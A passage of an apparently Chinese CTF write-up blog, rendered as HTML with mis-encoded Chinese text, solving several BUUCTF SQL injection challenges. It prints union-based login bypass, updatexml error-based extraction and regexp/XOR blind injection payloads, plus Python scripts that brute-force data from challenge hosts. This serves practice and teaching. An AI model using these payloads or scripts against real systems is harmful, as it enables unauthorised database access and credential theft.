class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^length(database())&gt;0</span><br></pre></td></tr></table></figure><p>å›æ˜¾<code>Clever! But not this table.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^length(database())&lt;0</span><br></pre></td></tr></table></figure><p>å›æ˜¾<code>ERROR</code></p><p>ç”±äºè¿‡æ»¤äº†ifå…³é”®å­—ï¼Œæ‰€ä»¥è¦ä½¿ç”¨regexç›²æ³¨ï¼Œç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure><p>ç¡®å®šæ³¨å…¥ç‚¹å’Œpayloadå½¢å¼åå¼€å§‹ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://410b10a4-249a-4d9b-b1df-03f557672625.node3.buuoj.cn/search.php?id=6&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Clever! But not this table.&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;Flaaaaag&#x27;)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;index&#125;,1))&gt;&#123;char&#125;)^1&quot;</span></span><br><span class="line">        response = requests.get(url + payload.format(index=i, char=mid))</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabysqliV1">GXYCTF2019 BabysqliV1</h2><blockquote><p>åŸé¢˜ç›®æè¿°ï¼šåˆšå­¦å®Œsqliï¼Œæˆ‘æ‰çŸ¥é“ä¸‡èƒ½å£ä»¤è¿™ä¹ˆå±é™©ï¼Œè¿˜å¥½æˆ‘è¿›è¡Œäº†é˜²æŠ¤ï¼Œè¿˜ç”¨md5å“ˆå¸Œäº†å¯†ç ï¼</p><p>(BUUCTFæ²¡æœ‰æç¤ºå•Š!!!)</p></blockquote><h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3><ul><li>SQLè”åˆæŸ¥è¯¢</li></ul><h3 id="è§£é¢˜-v7">è§£é¢˜</h3><p>å…ˆFUZZä¸€æ³¢è¿‡æ»¤äº†æŸäº›å­—ç¬¦ï¼Œå¸¸è§„çš„æ³¨å…¥éƒ½æ²¡èƒ½passï¼ŒæŸ¥çœ‹æºç å‘ç°ä¸€ä¸ª<code>search.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200621142049.png" alt=""></p><blockquote><p>å…ˆè¯´è¯´base32 å’Œ base64 çš„åŒºåˆ«ï¼Œ<br>base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—æ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚<br>base64 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå°å†™å­—æ¯ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚<br>æ˜æ˜¾ï¼Œé‚£æ®µæ–‡å­—æ˜¯base32åŠ å¯†</p></blockquote><p>è§£å¯†åï¼š<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p><p>ç»§ç»­base64è§£å¯†ï¼š<code>select * from user where username = '$name'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1  &#x2F;&#x2F; wrong user!    </span><br><span class="line">&gt;&gt;&gt; do not hack me!  &#x2F;&#x2F; orå’Œ&#x3D;è¢«è¿‡æ»¤äº†</span><br><span class="line">name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1   &#x2F;&#x2F; å¤§å°å†™ç›´æ¥ç»•è¿‡äº†</span><br><span class="line">name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1</span><br><span class="line">&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;å¯ä»¥çŸ¥é“æœ‰ä¸‰ä¸ªcolumn</span><br></pre></td></tr></table></figure><p>ç›²çŒœå­—æ®µåä¸º<code>id</code>ã€<code>username</code>ã€<code>password</code>ï¼Œå½“<code>username</code>ä¸º<code>admin</code>æ—¶ä¼šè¯´<code>wrong pass!</code>ï¼Œå…¶ä»–éƒ½æ˜¯<code>wrong user!</code>ï¼Œusernameåº”è¯¥å°±æ˜¯<code>admin</code>äº†ã€‚</p><p>é‚£ä¹ˆé€»è¾‘å°±æ˜¯ï¼š<strong>å…ˆåˆ¤æ–­<code>username</code>åœ¨ä¸åœ¨æ•°æ®åº“,å†åˆ¤æ–­å¯†ç å¯¹ä¸å¯¹</strong>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢çš„æ—¶å€™ä¼šåˆ›ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨å•ï¼Œè®©ä»–æŸ¥è¿™ä¸ªè™šæ‹Ÿè¡¨ã€‚</p><p>ä¸‹é¢çŒœæµ‹adminåœ¨å“ªä¸ªå­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,3#</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“æœ‰adminç”¨æˆ·çš„ï¼Œç»æµ‹è¯•<code>name=1'union select 1,'admin',3#</code>æŠ¥å¯†ç é”™è¯¯ï¼Œè¯´æ˜è¿™é‡Œå°±æ˜¯usernameäº†ï¼Œpasswordå­—æ®µåº”è¯¥æ˜¯3çš„ä½ç½®ã€‚</p><p>è¿™é“é¢˜å¾—çŒœå®ƒçš„åç«¯æºç æ˜¯æ€ä¹ˆå†™çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$passwd = md5($_POST[<span class="string">&#x27;pw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">&quot;select * from user where username = &#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!strcasecmp($passwd, $query[passwd])) &#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;Wrong Pass&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºnameå‚æ•°å¯æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ sqlè¯­å¥ä½¿å…¶æŸ¥è¯¢ä¸ºå‡ï¼Œç„¶åè”åˆæŸ¥è¯¢å‡ºä¸€ä¸ªæ¯”å¦‚<code>0f5ed8a8d8d44d86a570aacffa922251</code>(ca01hçš„md5)ï¼Œç„¶åå¯†ç è¾“å…¥<code>ca01h</code>ï¼Œå°±ä¼šæŸ¥è¯¢æˆåŠŸã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#</span><br><span class="line">password &#x3D; ca01h</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://www.gem-love.com/ctf/453.html">https://www.gem-love.com/ctf/453.html</a></p></blockquote><h2 id="RCTF2015-EasySQL">RCTF2015 EasySQL</h2><h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3><ul><li>æŠ¥é”™æ³¨å…¥</li><li>äºŒæ¬¡æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v8">è§£é¢˜</h3><p>ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œæ³¨å†Œã€ç™»å½•å’Œä¿®æ”¹å¯†ç ï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬éƒ½æ˜¯äºŒæ¬¡æ³¨å…¥çš„é—®é¢˜ã€‚</p><p>åœ¨æ³¨å†Œé¡µé¢ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œ<code>username</code> å’Œ <code>email</code> å¤„æœ‰è¿‡æ»¤ï¼Œç›´æ¥ fuzz ä¸€ä¸‹å“ªäº›å­—ç¬¦è¢«ç¦äº†</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212053.png" alt=""></p><p>æ³¨å†Œç”¨æˆ·å<code>zzz\</code>ï¼Œåœ¨ç‚¹å‡»ä¿®æ”¹å¯†ç åï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200713212223.png" alt=""></p><p>çŒœæµ‹SQLè¯­å¥åº”è¯¥æ˜¯è¿™æ ·å†™çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &quot;zzz\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼çˆ†å‡ºæ•°æ®</p><ul><li><p>è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~root@localhost~'</code></p></li><li><p>æŸ¥çœ‹å½“å‰æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~web_sqli~'</code></p></li><li><p>æŸ¥çœ‹æ•°æ®åº“çš„è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~article,flag,users~'</code></p></li><li><p>æŸ¥çœ‹<code>users</code>è¡¨ä¸­çš„å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~name,pwd,email,real_flag_1s_her'</code></p><p>ä½¿ç”¨reverseå‡½æ•°æŸ¥çœ‹åé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema'</code></p></li><li><p>æŸ¥çœ‹<code>real_flag_1s_here</code>å­—æ®µçš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'</code></p><p>çœ‹åˆ°æœ‰å¾ˆå¤šåƒåœ¾æ•°æ®ï¼Œç”¨<code>regexp</code>åŒ¹é…<code>f</code>å¼€å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3'</code></p><p>å†ç”¨reverseå‡½æ•°è¯»åé¢çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))#</span><br></pre></td></tr></table></figure><p>è¿”å›<code>XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64'</code></p></li></ul><h2 id="GYCTF2020-Ezsqli">GYCTF2020 Ezsqli</h2><h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3><ul><li>æ— information_schemaå¸ƒå°”ç›²æ³¨</li><li>æ— åˆ—åæ³¨å…¥</li></ul><h3 id="è§£é¢˜-v9">è§£é¢˜</h3><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200714113824.png" style="zoom: 50%;" /><p>è¿‡æ»¤å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚information_schemaã€unionâ€¦selectã€joinã€ifã€andã€orç­‰ç­‰ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è€ƒè™‘ç›²æ³¨äº†ã€‚</p><p>å¦å¤–è¿˜å‘ç°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||1&#x3D;1</span><br><span class="line">è¿”å›Nu1l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||1&#x3D;5</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬æ¥2æŸ¥è¯¢çš„æ˜¯V&amp;Nï¼Œå¦‚æœ<code>||</code>åé¢çš„è¡¨è¾¾å¼ä¸ºTrueåˆ™è¿”å›Nu1Lã€falseåˆ™è¿”å›V&amp;Nã€‚</p><p>åˆ¤æ–­ä¸€ä¸‹æ˜¯ä¸æ˜¯ç›²æ³¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||length(database())&gt;0</span><br><span class="line">è¿”å›Nu1l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2||length(database())&lt;0</span><br><span class="line">è¿”å›V&amp;N</span><br></pre></td></tr></table></figure><p>ç¡®å®šæ˜¯ç›²æ³¨äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å†™è„šæœ¬ç”¨äºŒåˆ†æ³•ç›²æ³¨è¡¨åï¼Œå¯ä»¥ä½¿ç”¨sys.schema_table_statistics_with_buffer</p><blockquote><p>innodb_table_statså’Œinnodb_index_statså’Œsys.schema_table_statisticsä¹Ÿå¯ä»¥ä½¿ç”¨</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">&quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(target, i, mid)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users23333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å°±è¦å®ç°æ— åˆ—åæ³¨å…¥</p><blockquote><p>åœ¨çŸ¥é“è¡¨åï¼Œä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>union</code>æ¥ç»™æœªçŸ¥åˆ—åâ€œé‡å‘½åâ€ï¼Œè¿˜å¯ä»¥åˆ©ç”¨æŠ¥é”™å‡½æ•°æ¥æ³¨å…¥å‡ºåˆ—åã€‚</p></blockquote><p>è¿™é“é¢˜å†æå‡ºä¸€ç§æ€è·¯ï¼Œasciiä½åç§»å¤§å°æ¯”è¾ƒã€‚åå­—å¬èµ·æ¥æ¯”è¾ƒç„ä¹ï¼Œä½†æ˜¯åŸç†å¾ˆç®€å•ï¼š</p><blockquote><p>æ ¸å¿ƒpayloadï¼š<code>(select 'admin','admin')&gt;(select * from users limit 1)</code></p></blockquote><p>å‡è®¾flagä¸ºflag{bbbbb}ï¼Œå¯¹äºpayloadè¿™ä¸ªä¸¤ä¸ªselectæŸ¥è¯¢çš„æ¯”è¾ƒï¼Œæ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œå³å…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¯”ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼›åœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ASCIIå¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCIIå¤§çš„åˆ™å¤§ï¼Œè¿™ä¸ªä¸éš¾æ‡‚ï¼Œå’Œcè¯­è¨€çš„<code>strcmp()</code>å‡½æ•°åŸç†ä¸€æ ·ï¼Œä¸¾å‡ ä¸ªä¾‹å­ï¼š</p><ul><li>glag &gt; flag{bbbbb}</li><li>alag{zzzzzzzzzzz} &lt; flag{bbbbb}</li><li>a &lt; flag{bbbbb}</li><li>z &gt; flag{bbbbb}</li></ul><p>åœ¨è¿™æ ·çš„æŒ‰ä½æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œå› ä¸ºåœ¨é‡Œå±‚çš„<code>for()</code>å¾ªç¯ï¼Œå­—å…¸é¡ºåºæ˜¯ä»ASCIIç å°åˆ°å¤§æ¥æšä¸¾å¹¶æ¯”è¾ƒçš„ï¼Œå‡è®¾æ­£ç¡®å€¼ä¸ºbï¼Œé‚£ä¹ˆå­—å…¸è·‘åˆ°bçš„æ—¶å€™b=bä¸æ»¡è¶³payloadçš„å¤§äºå·ï¼Œåªèƒ½ç»§ç»­ä¸‹ä¸€è½®å¾ªç¯ï¼Œc&gt;bæ­¤æ—¶æ»¡è¶³äº†ï¼Œé¢˜ç›®è¿”å›çœŸï¼Œå‡ºç°äº†Nu1Lå…³é”®å­—ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦è®°å½•flagçš„å€¼äº†ï¼Œä½†æ˜¯æ­¤æ—¶è¿™ä¸€ä½çš„charæ˜¯cï¼Œè€ŒçœŸæ­£çš„flagçš„è¿™ä¸€ä½åº”è¯¥æ˜¯bæ‰å¯¹ï¼Œæ‰€ä»¥<code>flag += chr(char-1)</code>ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å­˜flagæ—¶å€™è¦å¾€å‰åç§»ä¸€ä½çš„åŸå› ã€‚</p><p>å¦å¤–è¿˜éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œå­—æ®µæ•°ä¸€å®šæ˜¯ä¸€ä¸€åŒ¹é…ï¼Œè¿™é‡Œf1ag_1s_h3r3_hhhhhæ˜¯æœ‰ä¸¤ä¸ªå­—æ®µçš„(å¯ä»¥ç”¨select 1|select 1,2|select 1,2,3è¯•ä¸€è¯•)ï¼ŒçŸ¥é“æ˜¯ä¸¤ä¸ªå­—æ®µåï¼Œè¿˜è¦æ³¨æ„å­—æ®µå†…çš„ä¸€ä¸€å¯¹åº”ï¼Œf1ag_1s_h3r3_hhhhhè¡¨ä¸­çš„flagåœ¨ç¬¬äºŒä¸ªå­—æ®µã€‚</p><p>ç›´æ¥show codeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;Nu1L&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        char = result + chr(j)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(char)</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(URL, data=data)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            result += chr(j - <span class="number">1</span>)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„æ‹¿åˆ°flagã€‚</p><h2 id="GXYCTF2019-BabysqliV3">GXYCTF2019 BabysqliV3</h2><h2 id="NCTF2019-SQLi">NCTF2019 SQLi</h2><h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3><ul><li>regexç›²æ³¨</li></ul><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/8003">REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥</a></p><h3 id="è§£é¢˜-v10">è§£é¢˜</h3><p>hint.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°adminçš„å¯†ç å³å¯å¾—flag</p><p>ç”±äºå•å¼•å·è¢«ç¦ç”¨ï¼Œä½¿ç”¨ \ è½¬ä¹‰andå‰é¢çš„é‚£ä¸ªå•å¼•å·ï¼Œä½¿å¾— <code>'\' and passwd='</code> å½¢æˆé—­åˆã€‚æ„é€ passwdå¤„ä¸º <code>||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>ï¼Œç”¨regexpæŸ¥è¯¢passwd ^åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ 